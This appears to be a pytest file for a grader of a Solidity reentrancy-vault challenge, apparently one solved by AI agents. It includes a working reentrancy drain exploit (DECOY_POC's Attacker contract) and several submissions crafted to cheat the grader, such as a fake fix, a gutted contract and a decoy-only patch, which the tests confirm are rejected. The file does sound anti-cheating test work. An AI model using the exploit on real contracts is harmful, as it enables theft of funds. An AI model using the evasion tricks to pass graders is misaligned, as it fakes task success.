"""End-to-end grader tests, including adversarial submissions that must be rejected.

Requires `forge` and a Solidity compiler on PATH (or FORGE/SOLC env vars). Skips
cleanly if they are absent, so `pytest` is safe to run anywhere.
"""

from __future__ import annotations

import shutil
import os
from pathlib import Path

import pytest

from axvigil_verifier.grader import grade
from axvigil_verifier.keccak import submission_hash
from axvigil_verifier.toolchain import discover_solc, forge_executable

CHALLENGES = Path(__file__).resolve().parents[2] / "challenges"
CH = CHALLENGES / "reentrancy-vault"

_forge = forge_executable()
_solc = discover_solc()


@pytest.fixture(scope="session", autouse=True)
def _require_forge():
    if not _forge:
        pytest.fail(
            "forge is required. Install foundry. These tests no longer skip when "
            "solc is only available via Foundry's svm cache."
        )


def _grade(submission: Path):
    return grade(CH, submission, forge_bin=_forge, solc=_solc, timeout_s=120)


def _write_submission(tmp: Path, patched_vault: str, poc: str) -> Path:
    (tmp / "patched").mkdir(parents=True)
    (tmp / "poc").mkdir(parents=True)
    (tmp / "patched" / "Vault.sol").write_text(patched_vault)
    (tmp / "poc" / "Poc.t.sol").write_text(poc)
    return tmp


VULN = (CH / "src" / "Vault.sol").read_text()
FIX = (CH / "solution" / "patched" / "Vault.sol").read_text()
GOOD_POC = (CH / "solution" / "poc" / "Poc.t.sol").read_text()

NOOP_POC = """// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
import {Test} from "forge-std/Test.sol";
import {Vault} from "../src/Vault.sol";
contract PocTest is Test {
    function test_noop() public pure { assertTrue(true); }
}
"""

GUTTED = """// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
contract Vault {
    mapping(address => uint256) public balanceOf;
    function deposit() external payable { balanceOf[msg.sender] += msg.value; }
    function totalAssets() external view returns (uint256) { return address(this).balance; }
}
"""


def test_reference_solution_passes():
    res = _grade(CH / "solution")
    assert res.passed, res.log
    assert res.pocProvesBug and res.pocFailsAfterPatch and res.hiddenTestsPass and res.patchWithinLimits
    hidden = (CH / "test" / "Hidden.t.sol").read_text()
    # Names of the hidden tests must not be echoed into the log the agent retries on.
    for line in hidden.splitlines():
        line = line.strip()
        if line.startswith("function test_"):
            name = line.split("(")[0].removeprefix("function ")
            assert name not in res.log
            assert name + "()" not in res.log
    # Hash is reproducible and matches a standalone computation.
    expected = "0x" + submission_hash("reentrancy-vault", 0, FIX, GOOD_POC).hex()
    assert res.submissionHash == expected


def test_fake_fix_rejected(tmp_path):
    # "Patch" is identical to the vulnerable contract: the PoC still drains it.
    sub = _write_submission(tmp_path, VULN, GOOD_POC)
    res = _grade(sub)
    assert not res.passed
    assert res.pocProvesBug is True
    assert res.pocFailsAfterPatch is False, res.log


def test_gutted_contract_rejected(tmp_path):
    # Deleting withdraw() trivially stops the PoC but destroys the interface.
    sub = _write_submission(tmp_path, GUTTED, GOOD_POC)
    res = _grade(sub)
    assert not res.passed
    assert res.patchWithinLimits is False, res.log


def test_noop_poc_rejected(tmp_path):
    # A real fix but a PoC that never demonstrates the bug. A trivial always-pass
    # test passes on the original too (pocProvesBug=True), so the differential is
    # what rejects it: it also passes on the patched contract, hence it never
    # "fails after patch". Credit requires pass-on-vulnerable AND fail-on-patched.
    sub = _write_submission(tmp_path, FIX, NOOP_POC)
    res = _grade(sub)
    assert not res.passed
    assert res.pocFailsAfterPatch is False, res.log


DECOY_POC = r"""// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
import {Test} from "forge-std/Test.sol";
import {Vault} from "../src/Vault.sol";

contract Attacker {
    Vault public vault;
    constructor(Vault v) { vault = v; }
    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            (bool ignored,) = address(vault).call(abi.encodeWithSignature("withdraw()"));
            ignored;
        }
    }
}

contract PocTest is Test {
    function test_exploitStillWorks() public {
        Vault vault = new Vault();
        address victim = makeAddr("victim");
        vm.deal(victim, 5 ether);
        vm.prank(victim);
        vault.deposit{value: 5 ether}();
        Attacker attacker = new Attacker(vault);
        vm.deal(address(this), 1 ether);
        attacker.attack{value: 1 ether}();
        assertEq(vault.totalAssets(), 0, "drained");
    }
    function test_decoyBeefCanWithdraw() public {
        Vault vault = new Vault();
        address beef = address(0xBEEF);
        vm.deal(beef, 1 ether);
        vm.prank(beef);
        vault.deposit{value: 1 ether}();
        vm.prank(beef);
        vault.withdraw();
        assertEq(vault.balanceOf(beef), 0);
    }
}
"""

# Does not fix reentrancy. Breaks only the decoy (0xBEEF). Hidden tests use other addresses.
PARTIAL = VULN.replace(
    'require(amount > 0, "nothing to withdraw");',
    'require(amount > 0, "nothing to withdraw");\n        require(msg.sender != address(0xBEEF), "blocked");',
)


def test_decoy_test_cannot_hide_a_live_exploit(tmp_path):
    sub = _write_submission(tmp_path, PARTIAL, DECOY_POC)
    res = _grade(sub)
    assert res.pocProvesBug is True, res.log
    assert res.pocFailsAfterPatch is False, res.log
    assert res.passed is False


def test_hash_is_whitespace_canonical():
    a = submission_hash("c", 1, "contract C{}\n", "contract T{}\n")
    b = submission_hash("c", 1, "contract C{}  \n\n", "contract T{}\r\n")
    assert a == b  # trailing whitespace / CRLF / blank tail don't change the hash
    c = submission_hash("c", 1, "contract D{}\n", "contract T{}\n")
    assert a != c  # real content change does
